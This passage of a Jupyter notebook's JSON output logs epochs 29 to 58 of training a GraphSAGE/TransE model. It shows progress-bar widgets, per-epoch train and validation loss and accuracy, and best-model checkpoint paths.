     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "fcf57db599554415b968735621b7da69",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:45:32 | INFO | Epoch 29 | Train Loss: 0.7119 | Train Accuracy: 0.8457\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c91830831d9b4879a728a1256b61cf1a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:45:34 | INFO | Validation Loss: 0.8610 | Validation Accuracy: 0.8247\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "22e109843f414a59b9c84e48c229a652",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:45:48 | INFO | Epoch 30 | Train Loss: 0.6999 | Train Accuracy: 0.8464\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "6e345bffbea24215a55785aac695d796",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:45:50 | INFO | Validation Loss: 0.7365 | Validation Accuracy: 0.8572\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "3fda2e1d0eff4217827d1434e41143dd",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:46:03 | INFO | Epoch 31 | Train Loss: 0.7002 | Train Accuracy: 0.8508\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "3d46cea5ad774cefa0d4717628ae8102",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:46:04 | INFO | Validation Loss: 0.7412 | Validation Accuracy: 0.8416\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "6d6caeb35215477d96ca6a1e51a49a71",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:46:19 | INFO | Epoch 32 | Train Loss: 0.7097 | Train Accuracy: 0.8476\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2e70684b7130489b88f4d7201c11263b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:46:21 | INFO | Validation Loss: 0.7927 | Validation Accuracy: 0.8319\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ee62cae84d464ecfa61fc78fa272cfb8",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:46:35 | INFO | Epoch 33 | Train Loss: 0.7253 | Train Accuracy: 0.8383\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d21060cc324d472da4c0d1e3e3472a75",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:46:36 | INFO | Validation Loss: 0.6920 | Validation Accuracy: 0.8530\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5bf40ee4b8ee4b909f6eb50dceab5953",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:46:50 | INFO | Epoch 34 | Train Loss: 0.7055 | Train Accuracy: 0.8457\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8676a60a7e3c4d8f8ba2fd74d67b6b49",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:46:51 | INFO | Validation Loss: 0.7669 | Validation Accuracy: 0.8450\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "afc8db2464fb4392b706a80f037b8c45",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:47:05 | INFO | Epoch 35 | Train Loss: 0.6964 | Train Accuracy: 0.8469\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2502c9e914a743e6bb1443dcaf81ffba",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:47:06 | INFO | Validation Loss: 0.7427 | Validation Accuracy: 0.8440\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f7cf79860bd6455db840f1e4a6eb0b1a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:47:21 | INFO | Epoch 36 | Train Loss: 0.7065 | Train Accuracy: 0.8416\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9c6992b324ef47b99531b09a9dccfa8e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:47:23 | INFO | Validation Loss: 0.7067 | Validation Accuracy: 0.8495\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4f94b52dac754bae8dfb1c398d2c1624",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:47:36 | INFO | Epoch 37 | Train Loss: 0.6597 | Train Accuracy: 0.8556\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "fcaf224901654e02961a0000d05d5c16",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:47:38 | INFO | Validation Loss: 0.7087 | Validation Accuracy: 0.8516\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "320cbeb468f34c77b8c91d4ec0b98c1a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:47:51 | INFO | Epoch 38 | Train Loss: 0.6778 | Train Accuracy: 0.8464\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d7eba13d40db4f53967870cbd6627fad",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:47:52 | INFO | Validation Loss: 0.6735 | Validation Accuracy: 0.8662\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_transE_50/epoch_38_loss_0.6735_acc_0.8662\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "bdbb3a9b1aee469297ed642e9abbe6e6",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:48:06 | INFO | Epoch 39 | Train Loss: 0.6653 | Train Accuracy: 0.8495\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "0a95a77642a8498a872f278545cafe49",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:48:07 | INFO | Validation Loss: 0.7177 | Validation Accuracy: 0.8478\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9079ee3a520f4b07ab099aad0651c0ba",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:48:21 | INFO | Epoch 40 | Train Loss: 0.6628 | Train Accuracy: 0.8481\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7e2fcfcb17ec4b5bbb4e2b588b01adbb",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:48:22 | INFO | Validation Loss: 0.6912 | Validation Accuracy: 0.8519\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e155d148b5ce4980bfadb20db025a0d7",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:48:34 | INFO | Epoch 41 | Train Loss: 0.6705 | Train Accuracy: 0.8456\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "14406df91a514795ae5968aae3d88c2c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:48:36 | INFO | Validation Loss: 0.7050 | Validation Accuracy: 0.8494\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c953a799bc1c41168642ead880e5563b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:48:48 | INFO | Epoch 42 | Train Loss: 0.6711 | Train Accuracy: 0.8442\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9fba5d5e39df479687019c4b907e4c8e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:48:49 | INFO | Validation Loss: 0.6973 | Validation Accuracy: 0.8451\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "dd6574c72b6748548a1f5e9e7406721a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:49:03 | INFO | Epoch 43 | Train Loss: 0.6616 | Train Accuracy: 0.8514\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4e1c7203ddc24371859de72a38048ebd",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:49:04 | INFO | Validation Loss: 0.7207 | Validation Accuracy: 0.8433\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "46c5d93c6cb74ce392813b8afeed5b58",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:49:16 | INFO | Epoch 44 | Train Loss: 0.6583 | Train Accuracy: 0.8472\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "3fccb5e3fa63461dbefdc50f0cae0dfe",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:49:17 | INFO | Validation Loss: 0.7465 | Validation Accuracy: 0.8349\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "dbfc713960dc4af99488a85d457cc882",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:49:33 | INFO | Epoch 45 | Train Loss: 0.6391 | Train Accuracy: 0.8511\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "22b637e58e604f1e84fbad7fe492b942",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:49:34 | INFO | Validation Loss: 0.7535 | Validation Accuracy: 0.8228\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "0f0dcc8e86944337a57c2408677b6bb8",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:49:47 | INFO | Epoch 46 | Train Loss: 0.6413 | Train Accuracy: 0.8530\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "1eeec2294e3042ac8e8c939e2455e465",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:49:48 | INFO | Validation Loss: 0.6503 | Validation Accuracy: 0.8571\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_transE_50/epoch_46_loss_0.6503_acc_0.8571\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8ec16ecffa9c426d97f76fa234c62899",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:50:02 | INFO | Epoch 47 | Train Loss: 0.6468 | Train Accuracy: 0.8476\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "3cdc86a28d1f4007a172a0bb76d7b7fd",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:50:04 | INFO | Validation Loss: 0.6573 | Validation Accuracy: 0.8543\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2f8d9ae5b7ce47d2814ee76029d70cb6",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:50:17 | INFO | Epoch 48 | Train Loss: 0.6292 | Train Accuracy: 0.8532\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "3f09c8d5ee1045c2a97fef071c9f4704",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:50:18 | INFO | Validation Loss: 0.6623 | Validation Accuracy: 0.8413\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7fbe581327214434b42bc67e603e3662",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:50:30 | INFO | Epoch 49 | Train Loss: 0.6675 | Train Accuracy: 0.8453\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8f5d05b2ad4e4c56b7092d6bfbe310a3",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:50:32 | INFO | Validation Loss: 0.6983 | Validation Accuracy: 0.8187\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a99c7d0fa34f40aba5c6b3ef895e916f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:50:45 | INFO | Epoch 50 | Train Loss: 0.6312 | Train Accuracy: 0.8503\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "1d913afd79f74b8b8bf6eedf0a17f732",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:50:47 | INFO | Validation Loss: 0.6878 | Validation Accuracy: 0.8372\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "6613e7f911e5414aa5a0b952bd501afe",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:51:00 | INFO | Epoch 51 | Train Loss: 0.6193 | Train Accuracy: 0.8580\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "22de25f7e64b4b8c863aa92dcdbbb040",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:51:01 | INFO | Validation Loss: 0.6626 | Validation Accuracy: 0.8417\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f4746fbfdbae449db3c3c306c42813d4",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:51:13 | INFO | Epoch 52 | Train Loss: 0.6064 | Train Accuracy: 0.8619\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "332cbec7ad67427582287f2e9e1c614e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:51:15 | INFO | Validation Loss: 0.7552 | Validation Accuracy: 0.8343\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5af054febc1a476983fb3cdcf143b7f0",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:51:28 | INFO | Epoch 53 | Train Loss: 0.6001 | Train Accuracy: 0.8628\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f6ea05a1fec34723b76ed64ec8ff2c16",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:51:29 | INFO | Validation Loss: 0.7314 | Validation Accuracy: 0.8162\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "65df22cab69d49728928393a5587b60e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:51:42 | INFO | Epoch 54 | Train Loss: 0.6166 | Train Accuracy: 0.8598\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b219ac9708c049cca114f3eb473394dc",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:51:44 | INFO | Validation Loss: 0.7027 | Validation Accuracy: 0.8278\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e724eea27c80470b9f328560bbc57992",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:51:56 | INFO | Epoch 55 | Train Loss: 0.6181 | Train Accuracy: 0.8587\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "0fc67e7f9bf54f21ad47b313b315d8d3",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:51:57 | INFO | Validation Loss: 0.7017 | Validation Accuracy: 0.8248\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a75e9742563e4977817e917622ce64f2",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:52:09 | INFO | Epoch 56 | Train Loss: 0.6311 | Train Accuracy: 0.8548\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "627e8dfc26ee47c9b19b27590972c0bb",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:52:11 | INFO | Validation Loss: 0.6474 | Validation Accuracy: 0.8302\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_transE_50/epoch_56_loss_0.6474_acc_0.8302\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c0165c9cde8f4a0090cbdd942ce64e97",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:52:26 | INFO | Epoch 57 | Train Loss: 0.6297 | Train Accuracy: 0.8602\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e09657aad16645c2b7b46cfb70b7e94f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:52:28 | INFO | Validation Loss: 0.6950 | Validation Accuracy: 0.8341\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8d9aea372458425faab58be627b5862a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:52:41 | INFO | Epoch 58 | Train Loss: 0.6167 | Train Accuracy: 0.8587\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7ff839bb2df74b8ab2516cebf10c4a78",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
